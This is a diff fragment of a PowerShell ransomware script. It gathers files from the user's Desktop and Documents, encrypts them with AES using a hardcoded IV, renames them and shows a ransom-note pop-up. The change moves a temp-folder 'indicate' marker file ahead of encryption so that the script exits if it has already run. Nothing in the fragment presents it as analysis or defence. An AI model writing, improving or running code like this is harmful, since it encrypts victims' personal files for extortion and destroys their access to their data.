@@ -42,6 +42,12 @@ $whuri = "$dc"
 $SourceFolder = "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents"
 $files = Get-ChildItem -Path $SourceFolder -File -Recurse
 
+# Generate the indcator file (for pop-up close detection)
+$indicator = "$env:tmp/indicate"
+if (!(Test-Path -Path $indicator)){
+"indicate" | Out-File -FilePath $indicator -Append
+}else{exit}
+
 # Encryption setup
 $CustomIV = 'r7SbTffTMbMA4Zm70iHAwA=='
 $Key = [System.Security.Cryptography.Aes]::Create()
@@ -76,9 +82,6 @@ foreach ($file in $files) {
     $newPath = Join-Path -Path $SourceFolder -ChildPath $newName
     Rename-Item -Path $file.FullName -NewName $newName
 }
-
-# Generate the indcator file (for pop-up close detection)
-"indicate" | Out-File -FilePath $env:tmp/indicate -Append
 
 # POP-UP / RANSOM NOTE
 # Define code for the pop-up
